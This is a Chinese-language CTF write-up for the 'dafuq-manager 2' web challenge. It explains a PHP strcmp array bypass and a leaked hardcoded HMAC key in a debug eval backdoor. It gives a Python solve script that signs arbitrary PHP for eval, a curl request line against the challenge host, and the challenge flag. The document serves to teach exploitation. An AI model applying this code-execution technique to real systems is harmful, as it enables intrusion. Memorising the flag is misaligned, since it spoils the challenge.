# PHM #32 Web — dafuq-manager 2

| 項目 | 值 |
|:---|:---|
| 類別 | Web |
| 分數 | 100 |

## 題目

> Login as admin, code review and get flag 2

## 分析

Code review `dafuqManager.7z` 的 source. `index.php` 有一個隱藏的 `debug` action:

```php
case "debug":
    require "./core/fun_debug.php";
    do_debug($GLOBALS["dir"]);
```

`core/fun_debug.php`:

```php
function do_debug() {
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', ...);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) die('2bad');
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    }
}
```

兩個關鍵 bug:

### 1. `strcmp` + array = NULL bypass

要三個 strcmp **全部** return 0 (falsy) 才能通過. string 不可能同時等於三個不同值, 但 **`strcmp(array, string)` 回 null**, null 在 OR 判斷中 falsy → 全部過關.

→ 送 `?dir[]=magically` (或任意 array value).

### 2. secret_key 寫死在 config.php 裡

```php
$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
```

Source backup 洩漏 → 直接本地算 `hash_hmac('sha256', $cmd, $secret)` 就是合法簽章.

### Flag2 位置

Flag2 檔案在 `/var/www/webhdisk/data/.flag-2_（´・ω・｀）.txt`, 在 `/data/` 層 (guest 的 home 之上). 透過 `eval` 直接讀.

## 解法

```python
import base64, hmac, hashlib, urllib.parse
secret = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3'

cmd = 'echo file_get_contents("/var/www/webhdisk/data/.flag-2_（´・ω・｀）.txt");'
cmd_b64 = base64.b64encode(cmd.encode()).decode()
h = hmac.new(secret.encode(), cmd.encode(), hashlib.sha256).hexdigest()
command = urllib.parse.quote(f'{cmd_b64}.{h}')

# curl 'https://dafuq-manager.hackme.quest/index.php?action=debug&dir[]=magically&command=' + command
```

送 request → flag.

## Flag

```
FLAG{how do you turn this on?}
```

## 感想

兩個經典 PHP 坑:

1. **`strcmp` + 非 string 回 NULL/warning**: 一直是 CTF 經典, 很多 code 寫 `if (strcmp(...))` 當 bool 用, 忘了 null 的狀況.
2. **Secret 寫在 source**: Backup 檔的最大風險. `.config/conf.php` 本該用 `.htaccess` 擋 (有擋網路存取但 archive 還是打包進去).

雖然題目說「Login as admin」, 但實際路線是從 source 找到 debug backdoor 直接 eval. 不用 admin 權限.
